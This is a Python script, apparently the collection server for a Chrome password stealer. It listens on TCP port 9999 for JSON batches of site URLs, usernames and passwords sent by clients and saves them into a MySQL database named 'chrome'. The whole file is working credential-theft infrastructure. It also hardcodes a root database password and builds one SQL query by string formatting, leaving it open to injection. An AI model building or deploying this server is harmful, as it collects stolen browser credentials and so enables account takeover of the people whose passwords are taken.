#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re
import socketserver, os
import json
import traceback

import pymysql

# 服务器IP和端口
HOST, PORT = '0.0.0.0', 9999


# 处理客户端数据
def get_info(info):
    dbinfo = []
    info = info.decode()
    info = json.loads(info)
    if info['status'] == 'seccess':
        dbinfo = info['chrome']
    else:
        dbinfo = None
    return dbinfo


# 判断数据库是否存在,不存在则创建
def database_exist(database_name):
    connect = pymysql.connect(
        host='localhost',
        user='root',
        password='123456',
        port=3306,
        charset='utf8',
    )
    con = connect.cursor()
    sql = "show databases"
    con.execute(sql)
    databases = [con.fetchall()]
    databases_li = re.findall("\'(.*?)\'",str(databases))
    if database_name not in databases_li:
        sql = "create database %s charset utf8mb4" %database_name
        con.execute(sql)
    connect.commit()
    con.close()
    connect.close()


# 判断某库中的某表是否存在，不存在则创建
def table_exsit(database_name,table_name):
    connect = pymysql.connect(host='localhost', user='root', password='123456', database=database_name)
    con = connect.cursor()
    try:
        sql = "show tables"
        con.execute(sql)
        tables = [con.fetchall()]
        table_list = re.findall('\'(.*?)\'', str(tables))
        if table_name not in table_list:
            sql_table = """
                create table %s(
                    id int  auto_increment primary key,
                    url varchar(255) not null,
                    user char(50),
                    pass varchar(255)
                )ENGINE=InnoDB DEFAULT CHARSET=utf8;
            """ % table_name
            con.execute(sql_table)
            index = "alter table %s add unique index save_unique_index(url,user)" %table_name
            con.execute(index)
    except Exception as e:
        # traceback.print_exc()
        print(e)
    connect.commit()
    con.close()
    connect.close()

#添加数据，需要在代码中更改表名
def add_table_info(database_name,info):
    info_li = []
    conn = pymysql.connect(host='localhost', user='root', password='123456', database=database_name)
    cursor = conn.cursor()
    for i in range(len(info)):
        jude_info = "select url, user from chrome where url ='%s' and user = '%s'" % (info[i]['url'], info[i]['user'])
        if cursor.execute(jude_info) > 0:
            continue
        else:
            db_info = "insert into chrome(url,user, pass) values(%s, %s ,%s ) "
            info_li.append(info[i]['url'])
            info_li.append(info[i]['user'])
            info_li.append(info[i]['pass'])
            cursor.execute(db_info, info_li)
            info_li = []
    conn.commit()
    cursor.close()
    conn.close()

class MyTCPHandler(socketserver.BaseRequestHandler):
    def handle(self):
        try:
            while True:
                info = self.request.recv(1024)
                # print("{} send:".format(self.client_address),self.data.decode("utf8"))
                # info = self.data.decode("utf8")
                info = get_info(info)
                if info is None:
                    self.request.sendall("False".encode("utf8"))
                else:
                    table_exsit('chrome','chrome')
                    add_table_info('chrome',info)
                    self.request.sendall("True".encode("utf8"))
        except Exception as e:
            # traceback.print_exc()
            print(e)
            print(self.client_address, "Connection disconnect")
        finally:
            self.request.close()

    def setup(self):
        print("before handle,start connection：", self.client_address)

    def finish(self):
        print("finish run  after handle")


if __name__ == '__main__':
    database_exist('chrome')
    server = socketserver.ThreadingTCPServer((HOST, PORT), MyTCPHandler)
    server.serve_forever()
